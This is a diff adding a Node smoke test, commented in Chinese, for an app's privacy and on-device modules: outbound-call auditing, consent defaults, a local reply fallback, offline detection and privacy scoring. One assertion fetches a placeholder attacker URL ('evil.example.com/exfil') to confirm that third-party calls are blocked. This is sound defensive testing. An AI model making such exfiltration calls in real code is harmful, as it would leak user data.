@@ -174,6 +174,9 @@ async function main() {
   // 候选 B · 语音 端到端烟雾测试（自包含段，复用 ok() 并入总 tally）
   await voiceSmokeTest();
 
+  // 候选 C · 隐私/端侧增强 端到端烟雾测试（自包含段，复用 ok() 并入总 tally）
+  await cSmokeTest();
+
   console.log(`\n结果：通过 ${pass} / 失败 ${fail}`);
   process.exit(fail === 0 ? 0 : 1);
 }
@@ -333,6 +336,99 @@ async function voiceSmokeTest() {
     ok("Voice.__zeroReportProbe().outbound === 0", Voice.__zeroReportProbe().outbound === 0);
   } finally {
     globalThis.fetch = realFetch;
+  }
+}
+
+/* ============== 候选 C · 隐私/端侧增强 端到端烟雾测试 ==============
+ * 自包含段：在 Node 下为 C 模块补齐浏览器全局（localStorage / navigator / fetch 受控桩），
+ * 动态 import CJS 模块（取 default）后断言：
+ *   ① AuditProbe 安装后零上报证明（第三方外发被拦截 blocked++）
+ *   ② ConsentStore 默认同意态（tts/asr/ltm=true、cloudSync=false）
+ *   ③ LocalHeuristic 兜底（非空 / 可用 / 零外部调用）
+ *   ④ OfflineProbe 三态（online / offline / degraded）
+ *   ⑤ PrivacyScore 计算（默认优、0-100 收口）
+ * 复用既有 ok() 断言，结果并入总 pass/fail，不破坏上方任何断言；计数应上升。 */
+async function cSmokeTest() {
+  console.log("\n[c-privacy] 候选 C 隐私/端侧增强 端到端烟雾测试");
+
+  // --- 受控浏览器全局（避免真实网络；供 AuditProbe 包装与 OfflineProbe 探测）---
+  const realFetch = globalThis.fetch;
+  let fetchCalls = 0;
+  globalThis.fetch = function () { fetchCalls++; return Promise.resolve({ ok: true, status: 200, json: async () => ({}) }); };
+  const realNav = globalThis.navigator;
+  // Node 22 的 globalThis.navigator 只读，用 defineProperty 覆盖（configurable 以便 finally 还原）
+  Object.defineProperty(globalThis, "navigator", {
+    value: { onLine: true, sendBeacon() { return true; }, userAgent: "xinyu-shim" },
+    configurable: true, writable: true,
+  });
+  globalThis.window = globalThis.window || globalThis;
+  // 清空 C 相关 localStorage 键，保证默认态
+  try { globalThis.localStorage.removeItem("xinyu.consent"); } catch (e) {}
+  try { globalThis.localStorage.removeItem("xinyu.audit"); } catch (e) {}
+
+  // 动态 import C 模块（CJS，取 default）：IIFE 副作用同时挂 window.*
+  const AuditProbe = (await import("../audit-probe.js")).default;
+  const ConsentStore = (await import("../consent-store.js")).default;
+  const LocalHeuristic = (await import("../local-heuristic.js")).default;
+  const OfflineProbe = (await import("../offline-probe.js")).default;
+  const PrivacyScore = (await import("../privacy-score.js")).default;
+
+  try {
+    // ① AuditProbe 安装后零上报证明
+    AuditProbe.install();
+    const ap = AuditProbe.getInstance();
+    const r0 = ap.proveZeroReporting();
+    ok("AuditProbe 安装后 zeroReporting=true", r0.zeroReporting === true);
+    ok("AuditProbe 安装后 blocked=0", r0.blocked === 0);
+    // 第三方外发应被拦截（reject）且 blocked 自增
+    let blockedRejected = false;
+    try { await fetch("https://evil.example.com/exfil"); } catch (e) { blockedRejected = true; }
+    ok("第三方 fetch 被 AuditProbe 拦截(reject)", blockedRejected);
+    ok("拦截后 blocked 自增(>=1)", ap.proveZeroReporting().blocked >= 1);
+    ap.reset();
+
+    // ② ConsentStore 默认同意态
+    globalThis.localStorage.removeItem("xinyu.consent");
+    const cs = new ConsentStore();
+    ok("ConsentStore 默认 tts=true", cs.get("tts") === true);
+    ok("ConsentStore 默认 asr=true", cs.get("asr") === true);
+    ok("ConsentStore 默认 ltm=true", cs.get("ltm") === true);
+    ok("ConsentStore 默认 cloudSync=false", cs.get("cloudSync") === false);
+
+    // ③ LocalHeuristic 兜底
+    const h = new LocalHeuristic();
+    ok("LocalHeuristic.isAvailable()=true", h.isAvailable() === true);
+    const before = fetchCalls;
+    const reply = await h.generate("小暖我想你了", { nick: "宝" });
+    ok("LocalHeuristic.generate 返回非空字符串", typeof reply === "string" && reply.length > 0);
+    ok("LocalHeuristic 过程零外部调用", fetchCalls === before);
+
+    // ④ OfflineProbe 三态
+    globalThis.navigator.onLine = true;
+    ok("OfflineProbe 默认 getState=online", new OfflineProbe().getState() === "online");
+    globalThis.navigator.onLine = false;
+    ok("OfflineProbe navigator.offline → offline", new OfflineProbe().getState() === "offline");
+    globalThis.navigator.onLine = true;
+    // 同源探测失败 → degraded（临时替换为 reject 桩，不影响计数桩语义）
+    const prevFetch = globalThis.fetch;
+    globalThis.fetch = function () { return Promise.reject(new Error("down")); };
+    const op3 = new OfflineProbe();
+    const st = await op3.checkConnectivity();
+    ok("OfflineProbe 探测失败 → degraded", st === "degraded");
+    globalThis.fetch = prevFetch;
+    globalThis.navigator.onLine = true;
+
+    // ⑤ PrivacyScore 计算
+    const ps = new PrivacyScore();
+    const def = ps.compute({ blocked: 0, consented: 0, cloudSync: false, storageBytes: 0 });
+    ok("PrivacyScore 默认(零上报) = 100", def === 100);
+    ok("PrivacyScore 评级=优", ps.grade(def) === "优");
+    const worst = ps.compute({ blocked: 50, consented: 9, cloudSync: true, storageBytes: 1e9 });
+    ok("PrivacyScore 始终落在 0-100", worst >= 0 && worst <= 100);
+  } finally {
+    globalThis.fetch = realFetch;
+    try { Object.defineProperty(globalThis, "navigator", { value: realNav, configurable: true, writable: true }); }
+    catch (e) { globalThis.navigator = realNav; }
   }
 }
 
